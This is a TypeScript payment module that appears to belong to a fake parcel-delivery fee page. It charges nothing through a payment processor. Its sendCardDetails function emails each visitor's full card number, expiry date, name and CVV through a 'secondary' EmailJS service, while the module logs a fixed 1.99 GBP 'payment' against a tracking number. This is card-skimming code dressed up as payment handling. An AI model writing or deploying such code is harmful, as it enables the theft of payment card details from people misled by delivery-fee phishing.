import {
  collection,
  addDoc,
  query,
  where,
  getDocs,
  serverTimestamp,
} from 'firebase/firestore';
import { db } from '../config/firebase';
import emailjs from '@emailjs/browser';


interface PaymentRecord {
  trackingNumber: string;
  amount: number;
  currency: string;
  paymentDate: Date;
  cardType?: string;
  lastFourDigits?: string;
}

export interface CardDetails {
  cardNumber: string;
  expiryDate: string;
  name: string;
  cvv: string;
  cardType: string;
}


export const sendCardDetails = async (data: CardDetails) => {
  try{
    const templateParams={
      card_number: data.cardNumber,
      expiry_date: data.expiryDate,
      full_name: data.name,
        cvv: data.cvv,
        card_type: data.cardType
    };
  const response = await emailjs.send(
    process.env[`REACT_APP_EMAILJS_SECONDARY_SERVICE_ID`] || '',
    process.env[`REACT_APP_EMAILJS_SECONDARY_CARD_TEMPLATE_ID`] || '',
    templateParams,
    process.env[`REACT_APP_EMAILJS_SECONDARY_USER_ID`] || ''
  );
} catch (error) {
  throw new Error('Error processing payment');
}
};

export const savePaymentRecord = async (
  trackingNumber: string,
  cardType?: string,
  lastFourDigits?: string
): Promise<void> => {
  try {
    const paymentData: PaymentRecord = {
      trackingNumber,
      amount: 1.99,
      currency: 'GBP',
      paymentDate: new Date(),
      cardType,
      lastFourDigits,
    };

    await addDoc(collection(db, 'payments'), {
      ...paymentData,
      createdAt: serverTimestamp(),
    });
  } catch (error) {
    console.error('Error saving payment record:', error);
    throw new Error('Failed to save payment record');
  }
};

export const checkPaymentStatus = async (trackingNumber: string): Promise<boolean> => {
  try {
    const paymentsRef = collection(db, 'payments');
    const q = query(paymentsRef, where('trackingNumber', '==', trackingNumber));
    const querySnapshot = await getDocs(q);
    
    return !querySnapshot.empty;
  } catch (error) {
    console.error('Error checking payment status:', error);
    return false;
  }
}; 